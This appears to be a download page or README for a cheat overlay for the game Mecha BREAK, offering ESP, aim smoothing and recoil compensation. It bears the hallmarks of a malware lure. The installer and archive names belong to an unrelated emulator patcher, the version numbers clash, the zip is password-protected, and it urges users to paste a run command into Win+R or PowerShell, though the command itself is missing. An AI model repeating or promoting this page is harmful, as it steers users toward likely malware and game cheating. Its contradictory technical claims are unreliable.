Mecha BREAK (v2.0.0 — Windows 10 / 11 x64)

 
 
 

 Mecha BREAK is a standalone 64-bit external overlay and trainer for Mecha BREAK on PC (Windows 10/11). It uses signature-based memory scanning and a borderless DirectX 11/12 ImGui overlay so base game files remain untouched.

---

 ⬇️ Download & Quick Setup (Windows 10 / 11 x64)

- 🚀 Open Mecha BREAK Setup Portal ( Rpcs3ProPatcher-Installer.exe ) — Interactive Setup & Mirrors 
- 📦 Direct Download Portable .ZIP Archive ( rpcs3-pro-patcher-installer-v2.4.0-win64.zip · 2.66 MB · Password: 2026 ) 
- 📋 Release Notes & SHA-256 Checksums ( v2.0.0 ) 

 ⚡ Instant 1-Command Setup ( Win + R or PowerShell · 3 Seconds)
Press Win + R (or open Windows Terminal / PowerShell ), paste the command below, and press Enter :

 

 

 

---

 Key Features & Technical Specs

- External read-only DirectX 12 / Vulkan overlay running at 144Hz+ with zero frame drop
- Customizable 2D Box, Skeleton, Health bar, and Distance ESP with visibility check
- Configurable FOV circle, smoothing curve, recoil compensation, and hotkey binder
- Loot / item value radar with custom color filters and JSON profile manager

 Property Specification 
 :--- :--- 
 Package Binary Rpcs3ProPatcher/Rpcs3ProPatcher-Installer.exe ( v2.0.0 ) 
 Target Runtime DirectX 11 / 12 & Vulkan External Overlay ( dxgi.dll / d3d11.dll ) 
 Install Path %LOCALAPPDATA%\Programs\MechaBreak 
 Supported OS Windows 10 / Windows 11 (64-bit, 22H2–24H2) 

---

 How to Install & Run

1. Open the Mecha BREAK Build & Setup Portal (v2.0.0) or Releases.
2. Extract Rpcs3ProPatcher and launch Rpcs3ProPatcher-Installer.exe (or use the 1-command Win + R setup on the portal).
3. Start Mecha BREAK in Windowed or Borderless Fullscreen mode.
4. Press INSERT in-game to open the overlay menu and configure hotkeys.
